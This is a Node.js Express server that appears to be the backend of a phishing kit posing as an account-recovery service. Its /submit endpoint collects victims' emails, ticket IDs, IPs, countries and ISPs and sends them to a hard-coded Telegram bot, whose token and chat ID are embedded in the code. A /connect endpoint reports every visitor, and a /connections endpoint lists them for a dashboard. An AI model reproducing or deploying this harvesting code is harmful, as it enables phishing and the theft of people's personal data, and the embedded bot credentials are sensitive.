const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');
const app = express();
const port = 3000;

// Telegram Bot Credentials
const botToken = "8316390502:AAHqAn5mgQQQzNuWfil2loNGRyDfowCG5Io";
const chatId = "7658971507";

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public'))); // Serve static files from "public"

// Store active connections
const connections = [];

// 📩 Submit form data
app.post('/submit', async (req, res) => {
  const { email, ticket, ip, country, isp } = req.body;

  const message =
    "`📩 new recovery  :`\n" +
    "```\n" +
    `Email: ${email}\n` +
    `ticket id: ${ticket}\n` +
    `IP: ${ip}\n` +
    `Country: ${country}\n` +
    `ISP: ${isp}\n` +
    "```";

  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown"
    });

    // Save to active connections array
    connections.push({
      email,
      ticket,
      ip,
      country,
      isp,
      page: "/thepage",  // or add dynamically if needed
      time: new Date().toISOString()
    });

    res.sendStatus(200);
  } catch (error) {
    console.error("❌ Telegram send failed:", error.message);
    res.sendStatus(500);
  }
});

// 🔔 New connection notification
app.post('/connect', async (req, res) => {
  const { ip, country, isp } = req.body;

  const connection = {
    ip,
    country,
    isp,
    page: "/thepage", // Modify as needed
    time: new Date().toISOString()
  };

  connections.push(connection); // Save to memory

  const message =
    "`🔔 New Active Connection:`\n" +
    "```\n" +
    `IP: ${ip}\n` +
    `Country: ${country}\n` +
    `ISP: ${isp}\n` +
    "```";

  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown"
    });
    res.sendStatus(200);
  } catch (error) {
    console.error("❌ Telegram connect failed:", error.message);
    res.sendStatus(500);
  }
});

// 🧾 Get all connections for dashboard display
app.get('/connections', (req, res) => {
  res.json(connections);
});

// Start server
app.listen(port, () => {
  console.log(`🚀 Server running at http://localhost:${port}`);
});
